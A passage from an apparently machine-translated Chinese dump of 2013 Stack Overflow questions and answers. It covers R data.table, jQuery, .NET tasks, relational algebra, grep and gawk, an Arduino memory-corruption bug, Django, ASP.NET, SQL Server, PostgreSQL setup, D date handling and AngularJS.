##  6:        G2  1.46705561
##  7:        G3  0.58451869
##  8:        G3 -0.20231228
##  9:        G3  0.52519475
## 10:        G3  0.62956475
## 11:        G3 -0.06655426
## 12:        G3  0.56814703

data.dt[!"G4",]
##    Treatment        Vals
## 1         G1  0.93411692
## 2         G1  0.60153972
## 3         G1  0.28147464
## 4         G1  0.97264924
## 5         G1  0.50804831
## 6         G1  0.48273876
## 7         G2  0.90264622
## 8         G2  1.47842130
## 9         G2  1.52494735
## 10        G2  1.46373958
## 11        G2  1.12850658
## 12        G2  1.46705561
## 13        G3  0.58451869
## 14        G3 -0.20231228
## 15        G3  0.52519475
## 16        G3  0.62956475
## 17        G3 -0.06655426
## 18        G3  0.56814703 
```

请注意，如果您在未设置为键的列上设置子集，则需要使用子集中的列名（例如`data.dt[Vals<0,]`）

我认为的创建者`data.table`可能正在研究一种直接从原始表中删除行的方法，而不是必须将所有未删除的行复制到新表中然后删除原始表。当您遇到内存限制时，这将是一个很大的帮助。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-15T21:44:16.020

问题是您没有选择要*删除*的行， 而是选择要*保留*的行。正如您所发现的，您通常可以互换这些概念，但有时会出现问题。

具体来说，当您使用时，`which`您是在询问 R“该向量的哪些元素是真实的”。但是，当它没有找到时，它会通过返回来表明这一点`integer(0)`。

Integer(0) 不是一个实际数字，因此取 Integer(0) 的负数仍然给出 Integer(0)。

但是，如果您只想使用它进行过滤，则无需使用 which。

取而代之的是，将您传递给的语句`which`作为过滤器直接传递给 `data[..]`. 回想一下，您可以将逻辑向量用作索引，也可以将整数向量用作索引。

# javascript - 停止输入清除 onFocus

> ID：14903736
> 
> 赞同：0
> 
> 时间：2013-02-15T21:38:27.877
> 
> 标签：javascript, jquery, html

我有这个电子邮件自动建议应用程序。一切都很好，除非我在输入字段之外单击然后单击它会清除“onFocus”中的内容。有什么想法可以阻止这种情况发生吗？

```
function suggest(inputString){
    if(inputString.length == 0) {
      $('#suggestions').fadeOut();
    } else {
    $('#email').addClass('load');
        $.post("auto.php", {queryString: ""+inputString+""}, function(data){
            if(data.length >0) {
                $('#suggestions').fadeIn();
                $('#suggestionsList').html(data);
                $('#email').removeClass('load');
          }
      });
   }
}

 function fill(thisValue) {
    $('#email').val(thisValue);
    setTimeout("$('#suggestions').fadeOut();", 600);
}

<input type="text" id="email" onKeyUp="suggest(this.value);" onClick="fill();" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:41:41.530

每当您单击输入框时，都会`onClick="fill();"`执行对元素的调用。`fill(undefined)`

这样做的第一件事是将输入框的值设置为`thisValue`（当前保持`undefined`），这将有效地擦除您的输入框。

这与焦点无关，尝试单击该框，输入一个值然后再次单击该框，它可能也会擦除该值而无需先单击关闭。

* * *

对于它的价值，你可能过于复杂了。我想清除框的要求是删除占位符文本。如果您正在为远程新浏览器进行设计，请使用 HTML5`placeholder="E-Mail"`让浏览器在用户未输入任何内容时以较浅的文本（或其他任何内容）显示该内容。

如果您必须支持较旧的浏览器，也有解决此问题的方法，这是一种简单但不完美的方法（您可以对此进行概括并制作一个 jQuery 插件，或者找到一个已经存在的插件）：

HTML：

```
<input type="text" id="email" class="placeholder" value="E-Mail" /> 
```

CSS：

```
.placeholder { color: #ccc; } 
```

Javascript：

```
;(function($) {

  $(document).ready(function() {

    $("#email").on('focus', function() {
      var $this = $(this);
      if ($this.hasClass('placeholder')) {
        $this.removeClass('placeholder');
        $this.val('');
      }
    });

    $("#email").on('keyUp', function() {
      // this is where your key-up code goes
    });

  });
})(jQuery); 
```

# c# - 如何继续使用前件的状态对象？

> ID：14903742
> 
> 赞同：1
> 
> 时间：2013-02-15T21:38:59.350
> 
> 标签：c#, .net-4.0, task-parallel-library

有没有办法将状态对象传递给 .net 4.0 中的 ContinueWith 函数？此选项在 .net 4.5 中可用。

我查看了 .net 4.0 的源代码，它在创建后续任务时将状态对象硬编码为 null。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:42:54.447

.NET 4 版本`ContinueWith`不提供此选项。

但是，您可以使用闭包或将数据包装到`Task<T>`自身中，具体取决于生成的方式，以便访问在先行任务中创建的状态数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-16T19:18:31.830

任务的 AsyncState 成员应该是您为原始任务提供的状态的值，即使在 ContinueWith 中被引用为先行任务时也是如此。这对 .Net 4.0 有效。

```
Task.Factory
    .StartNew( state => ..., myState)
    .ContinueWith( task => task.AsyncState == myState); 
```

# relational-algebra - 如何编写这些 SQL 查询的关系代数

> ID：14903748
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:39:22.917
> 
> 标签：relational-algebra

1.  从 branch = 'Pennywell' 的交易中选择 account_no、amount、customer

2.  选择 c.customer_name, c.cust_street, c.cust_city, b.branch_name, b.branch_city, a.account_no, a.balance from customer c, transactions t, accounts a, branch b where t.customer = c.customer_name and a .account_no = t.account_no 和 b.branch_name = a.branch_name

3.  select customer_name, cust_city from customer where customer_name not in（从交易中选择客户）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:29:46.947

第一个只是 Pennywell 上的选择，然后是 account_no、amount、customer 上的投影：

```
\pi_{account_no, amount, customer} (\sigma_branch = 'Pennywell'(transactions)) 
```

第二个遵循相同的原则：

1.  列出所有表格：

> 客户、交易、账户、分支机构

1.  使用 \rho 重命名每个：

> \rho_c（客户），\rho_t（交易），\rho_a（账户），\rho_b（分支机构）

1.  计算笛卡尔积

> \rho_c（客户）x \rho_t（交易）x \rho_a（账户）x \rho_b（分支）

1.  对第 3 步的结果执行选择（“where”），用连词替换和，或者用析取而不是否定：

> \sigma_{t.customer = c.customer_name /\ a.account_no = t.account_no /\ b.branch_name = a.branch_name}(\rho_c(客户) x \rho_t(交易) x \rho_a(账户) x \rho_b （分支））

1.  最后执行投影：

> \pi_{c.customer_name, c.cust_street, c.cust_city, b.branch_name, b.branch_city, a.account_no, a.balance}(\sigma_{t.customer = c.customer_name /\ a.account_no = t. account_no /\ b.branch_name = a.branch_name}(\rho_c(customer) x \rho_t(transactions) x \rho_a(accounts) x \rho_b(branch)))

最后一个查询有点棘手，它涉及更多的思考。

> \pi_{客户名称}（交易）

是我们想要忽略的所有客户和

> \pi_{客户名称}（客户）

都是客户。因此，

> \pi_{customer_name}（客户） - \pi_{customer_name}（交易）

都是我们想要保留的。最后我们需要找到他们的城市（为了简单起见，我使用了连接运算符 |x|）：

> \pi_{customer_name, cust_city}((\pi_{customer_name}(customer) - \pi_{customer_name}(transactions)) |x| customer)

# shell - 如何列出不包含两个不同字符串的所有文件

> ID：14903752
> 
> 赞同：5
> 
> 时间：2013-02-15T21:39:40.703
> 
> 标签：shell, scripting, grep

列出所有不包含 2 个不同字符串的文件

我有一个**目录**，其中包含许多以模式命名的文件，例如**file1.txt**

我可以列出所有不包含一个字符串的文件

```
grep -l "String" file* 
```

如何列出不包含我尝试过的两个字符串的文件？

```
grep -l "string1|string2" file* 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:40:47.900

您需要`e`grep 的参数，或使用 egrep。

使用 egrep：

```
egrep -L "string1|string2" file* 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T13:16:35.683

假设您只想打印包含所有字符串的文件的名称，这是一个适用于任意数量的字符串的解决方案，并且将进行字符串比较，而不是正则表达式比较：

```
gawk -v RS='\0' -v strings="string1 string2" '
BEGIN{ numStrings = split(strings,stringsA) }
{
   matchCnt = 0
   for (stringNr=1; stringNr<=numStrings; stringNr++)
      if ( index($0,stringsA[stringNr]) )
         matchCnt++
}
matchCnt == numStrings { print FILENAME }
' file* 
```

等一下，我刚刚注意到您要打印不包含 2 个字符串的文件。那将是：

```
gawk -v RS='\0' -v strings="string1 string2" '
BEGIN{ numStrings = split(strings,stringsA) }
{
   matchCnt = 0
   for (stringNr=1; stringNr<=numStrings; stringNr++)
      if ( index($0,stringsA[stringNr]) )
         matchCnt++
}
matchCnt == numStrings { matchesAll[FILENAME] }
END {
   for (fileNr=1; fileNr < ARGC; fileNr++) {
      file = ARGV[fileNr]
      if (! (file in matchesAll) )
         print file
   }
}
' file* 
```

打印不包含任何字符串的文件的名称将是：

```
gawk -v RS='\0' -v strings="string1 string2" '
BEGIN{ numStrings = split(strings,stringsA) }
{
   for (stringNr=1; stringNr<=numStrings; stringNr++)
      if ( index($0,stringsA[stringNr]) )
         matchesOne[FILENAME]
}
END {
   for (fileNr=1; fileNr < ARGC; fileNr++) {
      file = ARGV[fileNr]
      if (! (file in matchesOne) )
         print file
   }
}
' file* 
```

# c++ - Arduino加法作业

> ID：14903753
> 
> 赞同：1
> 
> 时间：2013-02-15T21:39:42.497
> 
> 标签：c++, arduino

我使用 Arduino 进行了一些编程，但我遇到了问题。在`loop()`函数中，我想在`pwm`每次`loop()`执行函数时为变量添加一个值。我从我编写的某个函数中获取该值并`pwm`使用命令将其添加到其中`pwm += result`，但它不起作用。如果我打印`pwm`，我总是得到零。即使打印`result`给了我一些非零值。整个代码是：

```
float pwm = 0;
float result = 0;

void loop(){

    ....

    errV = w - cm;
    errDtV = errOldV - errV;

    result = flc->cog(errV, errDtV);

    Serial.print("RESULT: ");
    Serial.println(result);

    pwm += result;
    Serial.println(pwm);
} 
```

输出是这样的：

```
RESULT: 31.98
0.00 
```

可能有什么问题？

编辑：这是整个草图

```
#include "FSet.h"
#include "FRule.h"
#include "Flc.h"
#include <NewPing.h>
#include "MotorControl.h"

MotorControl* m;
Flc* flc;
FRule* rule1,*rule2,*rule3,*rule4,*rule5,*rule6,*rule7,*rule8,*rule9;

NewPing sonar1(32,33,200);

static int dirA = 9;
static int pwmA = 8;

// Setup the FSets
FSet errZ(0,5,0);
FSet errMP(-15,15,0);
FSet errLP(-30,15,-1);

FSet errDtLN(-4,2,-1);
FSet errDtMN(-2,2,0);
FSet errDtZ(0,2,0);
FSet errDtMP(2,2,0);
FSet errDtLP(4,2,1);

FSet cntLN(-40,20,0);
FSet cntMN(-20,20,0);
FSet cntZ(0,20,0);
FSet cntMP(20,20,0);
FSet cntLP(40,20,0);

void setup(){
  Serial.begin(4800); 
  pinMode(dirA,INPUT);

  //Creating FRules for test    
  rule1 = new FRule(&errZ,&errDtMP,&cntMN);
  rule2 = new FRule(&errZ,&errDtZ,&cntZ);
  rule3 = new FRule(&errZ,&errDtMN,&cntMP);
  rule4 = new FRule(&errMP,&errDtLP,&cntMN);
  rule5 = new FRule(&errMP,&errDtMN,&cntMP);
  rule6 = new FRule(&errLP,&errDtMP,&cntMP);
  rule7 = new FRule(&errLP,&errDtZ,&cntLP);  
  rule8 = new FRule(&errLP,&errDtMN,&cntLP);  
  rule9 = new FRule(&errLP,&errDtLN,&cntLP);  

  flc = new Flc(9);
  flc->addRule(rule1);
  flc->addRule(rule2);
  flc->addRule(rule3);
  flc->addRule(rule4);
  flc->addRule(rule5);
  flc->addRule(rule6);
  flc->addRule(rule7); 
  flc->addRule(rule8);
  flc->addRule(rule9); 

}

int errV = 0;
int errOldV = 0;
int errDtV = 0;
int w = 30;
unsigned int uS;
unsigned int cm;

float pwm1 = 0;
float result = 0;

void loop(){   
  uS = sonar1.ping();
  cm = (uS / US_ROUNDTRIP_CM);

  errV = w - cm;
  errDtV = errOldV - errV;    

  result = flc->cog(errV,errDtV);

  Serial.print("RESULT: ");
  Serial.println(result);

  pwm1 = pwm1 + result;  

  Serial.println(pwm1);
  analogWrite(pwmA,pwm1);

  errOldV = errV;

} 
```

FLC 类头文件：#ifndef FLC_H #define FLC_H #include "Arduino.h" #include "FRule.h"

```
class Flc {
    public:
        Flc(int size);
        ~Flc();
        int addRule(FRule* rule);
        int mom(float x1,float x2);
        float cog(float x1,float x2);

        FRule** rules;

    private:
        int last;
        int size;
        float h;
        float numerator = 0;
        float denominator = 0;
        float result = 0;

};

#endif 
```

FLC 类源：#include "Arduino.h" #include "Flc.h"

```
Flc::Flc(int size){
    this->rules = (FRule**) malloc(sizeof(FRule*) * size);

    this->size = size;
    last = -1;
}

Flc::~Flc(){
    free(rules);
}

int Flc::addRule(FRule* rule){
    this->rules[++last] = rule;
    return last;
}

int Flc::mom(float x1,float x2){
    return 0.0;a
}

float Flc::cog(float x1, float x2){

    for(int i = 0; i < size;i++){

        h = rules[i]->dof(x1,x2);
        float area = rules[i]->widthOfCon() * ( h - h*h/2);

        numerator += rules[i]->cntrOfCon() * area;
        denominator += area;

    }

    result = numerator / denominator;

    return result;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T04:55:58.570

函数 cog() 中的某些东西踩到了变量 pwm。一旦 float 变量损坏， Serial.print() 将只显示零。下面的示例显示，将浮点数设置为 0xffffff，浮点数学库停止对变量进行任何操作。

运行下面的示例程序，您将看到一次 pwm 正确打印。在第一次错误调用之后，它会打印零。占用的内存也不再变化。

```
pwm=0.50 zpwm=0.50
pwm=0.00 zpwm=3.95 result=3.45
255-255-255-255
pwm=0.00 zpwm=4.45
pwm=0.00 zpwm=7.90 result=3.45
255-255-255-255 
```

示例程序显示了写入错误内存位置的函数。查看链接器输出的内存映射，变量按列出的顺序放置在内存中。所以写超过 var 的结尾，会损坏 pwm。

```
float zpwm = 0;
byte var = 0;
float pwm = 0;
float result = 0;

float badactor() {
  *((long*)(&var+1)) = -1;
  return 3.45;
}

void setup() {
  Serial.begin(57600);
}

void loop() {

  zpwm += 0.5;
  pwm += 0.5;

  Serial.print("pwm=");
  Serial.print(pwm);
  Serial.print(" zpwm=");
  Serial.println(zpwm);

  result = badactor();
  pwm += result;
  zpwm += result;

  Serial.print("pwm=");
  Serial.print(pwm);
  Serial.print(" zpwm=");
  Serial.print(zpwm);
  Serial.print(" result=");
  Serial.println(result);

  uint8_t* ptr;
  ptr = (uint8_t*)&pwm;
  Serial.print((int)*(ptr));
  Serial.print("-");
  Serial.print((int)*(ptr+1));
  Serial.print("-");
  Serial.print((int)*(ptr+2));
  Serial.print("-");
  Serial.println((int)*(ptr+3));

  delay(1000);
} 
```

# python - “模型”对象不可迭代

> ID：14903755
> 
> 赞同：2
> 
> 时间：2013-02-15T21:39:48.607
> 
> 标签：python, django

在作者模型中：

```
century = models.ManyToManyField(Century) 
```

鉴于：

```
a = get_object_or_404(Author.objects, id=id)

s = Author.objects.filter(century__in=a).order_by('?')[:3] 
```

错误：

> 异常值：“作者”对象不可迭代

怎么了？作者可能属于两个世纪，我想从他的世纪/世纪中随机获得 3 位作者。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:45:36.747

```
a = get_object_or_404(Author.objects, id=id)

s = Author.objects.filter(century__in=a.century.all()).order_by('?')[:3] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T21:47:15.093

[`get_object_or_404()`](https://docs.djangoproject.com/en/dev/topics/http/shortcuts/#get-object-or-404)将*类*作为第一个参数。例如

`a = get_object_or_404(Author, id=id)`

**更新评论：**

文档中的任何地方都没有提到它，但你是对的。事实上，`django/shortcuts/__init__.py`查看代码`get_object_or_404()`（`get_list_or_404()`

嗯。你每天都能学到一些东西！

# asp.net - 我用于学校的 FTP 不适用于任何给定的 .aspx 网页

> ID：14903760
> 
> 赞同：1
> 
> 时间：2013-02-15T21:40:20.300
> 
> 标签：asp.net

我尝试上传一个简单的 .HTML 网页以及一个 .PHP 网页。他们都工作得很好。但是，当使用 Visual Studio asp.net 并使用 Visual Basic 制作网站时，我发布项目时创建的 WebForm.aspx 页面不起作用。我得到错误：

```
Server Error in '/' Application.

Parser Error

Description: An error occurred during the parsing of a resource required to service this request. Please review the following specific parse error details and modify your source file appropriately. 

Parser Error Message: Could not load type 'Assignment_1_MattAndrzejczuk.WebForm1'.

Source Error: 
Line 1:  <%@ Page Language="vb" AutoEventWireup="false" CodeBehind="WebForm1.aspx.vb" Inherits="Assignment_1_MattAndrzejczuk.WebForm1" %> 
```

这是一个学校作业，我知道 Web 服务器可以工作，并且我已经在这个 Web 服务器上测试了 .HTML 和 .PHP 页面，它们工作得很好。但我不知道为什么我不能对 .aspx 页面做同样的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:49:10.637

您是否将根文件夹设置为 IIS 中的应用程序？似乎 ASP.NET 不知道去哪里找到 bin 文件夹。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-02-15T21:46:51.430

学校一般都提供 Linux 环境，他们的网络服务器只允许 PHP（我认为这是因为 Linux 和 PHP 都是开源的）。网上有很多免费的 ASP.NET 主机。

问候。

# sql-server-2008-r2 - 如何从 SQL Server 视图脚本中删除 sp_addextendedproperty？

> ID：14903761
> 
> 赞同：0
> 
> 时间：2013-02-15T21:40:25.327
> 
> 标签：sql-server-2008-r2, sqlcompare

我正在比较我的 Dev 和 QA 数据库。我的开发数据库有一堆 sp_addextendedproperty 信息，这会阻止脚本完全匹配。我尝试删除并重新创建有问题的视图，但噪音仍然存在。如何从 SQL Server 2008 R2 视图脚本中删除 sp_addextendedproperty？

```
EXECUTE sp_addextendedproperty @name = N'MS_DiagramPane1', @value = N'[0E232FF0-B466-11cf-A24F-00AA00A3EFFF, 1.00]
Begin DesignProperties = 
   Begin PaneConfigurations = 
      Begin PaneConfiguration = 0
         NumPanes = 4
         Configuration = "(H (1[40] 4[20] 2[20] 3) )"
      End
      Begin PaneConfiguration = 1
         NumPanes = 3
         Configuration = "(H (1 [50] 4 [25] 3))"
      End
      Begin PaneConfiguration = 2
         NumPanes = 3
         Configuration = "(H (1 [50] 2 [25] 3))"
      End
      Begin PaneConfiguration = 3
         NumPanes = 3
         Configuration = "(H (4 [30] 2 [40] 3))"
      End
      Begin PaneConfiguration = 4
         NumPanes = 2
         Configuration = "(H (1 [56] 3))"
      End
      Begin PaneConfiguration = 5
         NumPanes = 2
         Configuration = "(H (2 [66] 3))"
      End
      Begin PaneConfiguration = 6
         NumPanes = 2
         Configuration = "(H (4 [50] 3))"
      End
      Begin PaneConfiguration = 7
         NumPanes = 1
         Configuration = "(V (3))"
      End
      Begin PaneConfiguration = 8
         NumPanes = 3
         Configuration = "(H (1[56] 4[18] 2) )"
      End
      Begin PaneConfiguration = 9
         NumPanes = 2
         Configuration = "(H (1 [75] 4))"
      End
      Begin PaneConfiguration = 10
         NumPanes = 2
         Configuration = "(H (1[66] 2) )"
      End
      Begin PaneConfiguration = 11
         NumPanes = 2
         Configuration = "(H (4 [60] 2))"
      End
      Begin PaneConfiguration = 12
         NumPanes = 1
         Configuration = "(H (1) )"
      End
      Begin PaneConfiguration = 13
         NumPanes = 1
         Configuration = "(V (4))"
      End
      Begin PaneConfiguration = 14
         NumPanes = 1
         Configuration = "(V (2))"
      End
      ActivePaneConfig = 0
   End
   Begin DiagramPane = 
      Begin Origin = 
         Top = 0
         Left = 0
      End
      Begin Tables = 
         Begin Table = "apc"
            Begin Extent = 
               Top = 6
               Left = 38
               Bottom = 125
               Right = 236
            End
            DisplayFlags = 280
            TopColumn = 0
         End
         Begin Table = "p"
            Begin Extent = 
               Top = 6
               Left = 274
               Bottom = 125
               Right = 459
            End
            DisplayFlags = 280
            TopColumn = 0
         End
         Begin Table = "a"
            Begin Extent = 
               Top = 6
               Left = 497
               Bottom = 125
               Right = 669
            End
            DisplayFlags = 280
            TopColumn = 0
         End
         Begin Table = "ch"
            Begin Extent = 
               Top = 6
               Left = 707
               Bottom = 95
               Right = 867
            End
            DisplayFlags = 280
            TopColumn = 0
         End
         Begin Table = "c"
            Begin Extent = 
               Top = 6
               Left = 905
               Bottom = 125
               Right = 1065
            End
            DisplayFlags = 280
            TopColumn = 0
         End
         Begin Table = "r"
            Begin Extent = 
               Top = 96
               Left = 707
               Bottom = 185
               Right = 867
            End
            DisplayFlags = 280
            TopColumn = 0
         End
      End
   End
   Begin SQLPane = 
   End
   Begin DataPane = 
      Begin ParameterDefaults = ""
      End
      Begin ColumnWidths = 9
         Width = 284
         Width = 1500
         Width = 1500
         Width = 1500
         Width = 1500', @level0type = N'SCHEMA', @level0name = N'dbo', @level1type = N'VIEW', @level1name = N'vwAccountProfitCenters';
GO

EXECUTE sp_addextendedproperty @name = N'MS_DiagramPane2', @value = N'
         Width = 1500
         Width = 1500
         Width = 1500
         Width = 1500
      End
   End
   Begin CriteriaPane = 
      Begin ColumnWidths = 11
         Column = 1440
         Alias = 900
         Table = 1170
         Output = 720
         Append = 1400
         NewValue = 1170
         SortType = 1350
         SortOrder = 1410
         GroupBy = 1350
         Filter = 1350
         Or = 1350
         Or = 1350
         Or = 1350
      End
   End
End
', @level0type = N'SCHEMA', @level0name = N'dbo', @level1type = N'VIEW', @level1name = N'vwAccountProfitCenters';
GO

EXECUTE sp_addextendedproperty @name = N'MS_DiagramPaneCount', @value = 2, @level0type = N'SCHEMA', @level0name = N'dbo', @level1type = N'VIEW', @level1name = N'vwAccountProfitCenters';
GO 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-18T12:16:43.793

在 SQL 比较中（我使用的是 v10），一旦你完成了表映射，就会出现另一个名为 options 的选项卡。在忽略部分下面是一个用于扩展属性的复选框，勾选它然后每个表上是否有不同的属性都没有关系。

正如@Tarzan[在下面的评论中提到的：](https://stackoverflow.com/questions/14903761/how-can-i-remove-sp-addextendedproperty-from-a-sql-server-view-script/57812240#comment20968821_14936094)

> 是的，从 SSMS 转到“工具 > 选项 > SQL Server 对象资源管理器 > 脚本 > 脚本扩展属性 = False”。

# ruby-on-rails - PostgreSQL & Lion - 路径

> ID：14903766
> 
> 赞同：1
> 
> 时间：2013-02-15T21:40:40.533
> 
> 标签：ruby-on-rails, postgresql, osx-lion

试图让 postgres 与 Lion 合作。当我运行 rake:db create 我得到：

```
could not connect to server: Permission denied
Is the server running locally and accepting
connections on Unix domain socket "/var/pgsql_socket/.s.PGSQL.5432"? 
```

关于同一问题有很多 SO 主题，但没有一个解决方案对我有用。这是我尝试过的：

*   卸载并重新安装 pg gem
*   安装了 postgres.app（当我连接到本地服务器时，pg 仍然无法工作）
*   更新了路径文件，使 usr/local/bin 位于 usr/bin 之上
*   将 var/pgsql_socket 的权限更改为所有人的读/写权限

可能的提示是，当我运行 which psql 时，结果是 usr/bin/psql - 我相信它应该是 usr/local/bin/psql，但是在直接编辑我的路径文件之后，我不知道为什么它没有改变。Homebrew 对我来说也完全正常（那里没有路径问题）。

有任何想法吗？

编辑 - 我的 database.yml 中有什么：

```
development:
adapter: postgresql
encoding: unicode
database: hubbed_development
pool: 5
username: hubbed
password:
host: localhost

test:
adapter: postgresql
encoding: unicode
database: hubbed_test
pool: 5
username: hubbed
password:

production:
adapter: postgresql
encoding: unicode
database: hubbed_production
pool: 5
username: hubbed
password: 
```

编辑 - 运行 ps aux | grep postgres：

```
 666   0.0  0.0  2445588    540   ??  Ss    9:42am   0:00.00 postgres: checkpointer process      
 664   0.0  0.1  2445588   3604   ??  S     9:42am   0:00.02 /Applications/Postgres.app/Contents/MacOS/bin/postgres -D /Users/angsmith/Library/Application Support/Postgres/var -p5432
 681   0.0  0.0  2434892    540 s000  S+    9:43am   0:00.00 grep postgres
 670   0.0  0.0  2441868    396   ??  Ss    9:42am   0:00.00 postgres: stats collector process      
 669   0.0  0.0  2445720   1524   ??  Ss    9:42am   0:00.00 postgres: autovacuum launcher process      
 668   0.0  0.0  2445588    488   ??  Ss    9:42am   0:00.00 postgres: wal writer process      
 667   0.0  0.0  2445588    524   ??  Ss    9:42am   0:00.01 postgres: writer process 
```

编辑 - 在 postgress.app 中看到我的用户名是“postgres”。将我的 database.yml 用户名更新为 postgres 并运行 bundle exec rake db:create:all 后，我现在收到以下错误（与以前不同）：

```
 rake aborted!
 dlopen(/Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/pg-0.14.1/lib/pg_ext.bundle, 9): Library not loaded: /usr/local/lib/libpq.5.5.dylib
 Referenced from: /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/pg-0.14.1/lib/pg_ext.bundle
 Reason: image not found - /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/pg-0.14.1/lib/pg_ext.bundle
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/pg-0.14.1/lib/pg.rb:4:in `require'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/pg-0.14.1/lib/pg.rb:4:in `<top (required)>'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:68:in `require'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:68:in `block (2 levels) in require'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:66:in `each'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:66:in `block in require'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:55:in `each'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler/runtime.rb:55:in `require'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/gems/bundler-1.2.3/lib/bundler.rb:128:in `require'
 /Users/angsmith/hubbedspree/config/application.rb:7:in `<top (required)>'
 /Users/angsmith/hubbedspree/Rakefile:5:in `require'
 /Users/angsmith/hubbedspree/Rakefile:5:in `<top (required)>'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/bin/ruby_noexec_wrapper:14:in `eval'
 /Users/angsmith/.rvm/gems/ruby-1.9.3-p374/bin/ruby_noexec_wrapper:14:in `<main>'
 (See full trace by running task with --trace) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T21:20:52.397

在我的情况下，重新安装 pg gem 修复了它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:05:05.660

的条目`development`有该`host: localhost`行，但`test`和`production`配置缺少它。

如果您的 3 个数据库位于同一台服务器上，则它应该包含在所有配置中。

# linux - 如何将 D 中的纪元时间（unix 时间戳）转换为标准时间（年-月-日）

> ID：14903772
> 
> 赞同：4
> 
> 时间：2013-02-15T21:41:08.327
> 
> 标签：linux, date, time, d, unix-timestamp

如何将纪元时间（unix 时间戳）转换为 D 中的标准时间？有没有办法自定义格式？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T23:50:31.547

你真的应该把问题分开，而不是同时问两个完全不同的问题。

## 如何将纪元时间（unix 时间戳）转换为 D 中的标准时间？

如果您需要从 unix 时间转换为`SysTime`“标准时间”，那么您可以使用`unixTimeToStdTime`：

```
assert(unixTimeToStdTime(0) == (Date(1970, 1, 1) - Date.init).total!"hnsecs"); 
```

因此，如果您这样做`SysTime(unixTimeToStdTime(0))`，您将`SysTime`在 UTC 的 1970 年 1 月 1 日午夜（即纪元时间）的时间点获得当地时区的 a。与其他`SysTime`构造函数不同，它不会将给定的时间视为在给定的时区中。相反，它只是将其设置`stdTime`为给定值，并且设置`timezone`为给定值。因此，要构造`SysTime`与其他构造函数相同的构造函数，您需要执行类似的操作

```
auto epochInLocalTime = SysTime(Date(1970, 1, 1), UTC()).toLocalTime(); 
```

如果你想在相反的方向转换，`stdTimeToUnixTime`将 std 时间转换为 unix 时间。但是，`SysTime`有`toUnixTime`它，使您通常不需要`stdTimeToUnixTime`.

```
time_t epoch = epochInLocalTime.toUnixTime(); 
```

但是，需要注意的一件事是 std.datetime 真正处理 unix 时间的事实 -`time_t`始终被认为是 UTC。这很重要的原因是，由于某种莫名其妙的原因，Windows 将本地时间的 DST 应用于`time_t`UTC 偏移量永远不会改变，这意味着它在一年中的大部分时间都是错误的。它适用于所有使用 Microsoft 的函数`time_t`，因为他们认为这是无稽之谈，但是如果您尝试将 Windows`time_t`与另一个盒子或 std.datetime 等实际`time_t`正确使用的库一起使用，则会遇到互操作性问题。

## 有没有办法自定义格式？

您的意思是您正在寻找一种方法来为表示时间的字符串（如 C's `strftime`）提供用户定义的格式？std.datetime 还没有。API 仍然需要为其设计。已经进行了一些讨论，但尚未解决。所以，它最终会发生，但可能需要一段时间。

在此期间，您有`toISOString`、`toISOExtString`和`toSimpleString`，它们分别使用 ISO 格式、ISO 扩展格式和 Boost 的简单字符串格式。一般来说，我建议使用`toISOExtString`，因为它既易于人类阅读，又易于标准阅读。`sysTime.toUTC()`在与其他计算机通信（而不是为人类打印出来）时，通常最好将它放在 UTC（例如）中，因为时区是它的一部分，与`LocalTime`不附加时区的 with 不同。

如果您还没有阅读[有关 std.datetime 的这篇文章](http://dlang.org/intro-to-datetime.html)，那么我建议您阅读，因为它应该可以很好地概述该模块以及如何使用它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-15T22:49:27.230

我不熟悉 D，但根据[std.datetime](http://dlang.org/phobos/std_datetime.html)，您可以使用这些步骤

*   `long unixTimeToStdTime(time_t)`
*   `struct SysTime(long stdTime)`
*   `SysTime.dayOfGregorianCal()`
*   `struct Date(int day)`
*   `Date.toISOExtString()`

# javascript - 在 AngularJS 中，如何使用指令来创建具有更改变量名的模板？

> ID：14903774
> 
> 赞同：1
> 
> 时间：2013-02-15T21:41:11.547
> 
> 标签：javascript, templates, angularjs, angularjs-directive

我正在使用 AngularJS 创建一个问卷表单，并且我正在模板化不同类型的问题，我必须保持我的 HTML 轻量级。

HTML：

```
<qtnyesno qtn-variable="testVar">This is a test question. Yes or No?</qtnyesno>
testVar = {{testVar}} 
```

JS：

```
var module = angular.module('app', [])
.directive('qtnyesno', function() {
        return {
                restrict: 'E', // must be an HTML element
                transclude: true,
                scope: {
                        valvar: '@qtnVariable',
                },
                template:
                    '<div>' +
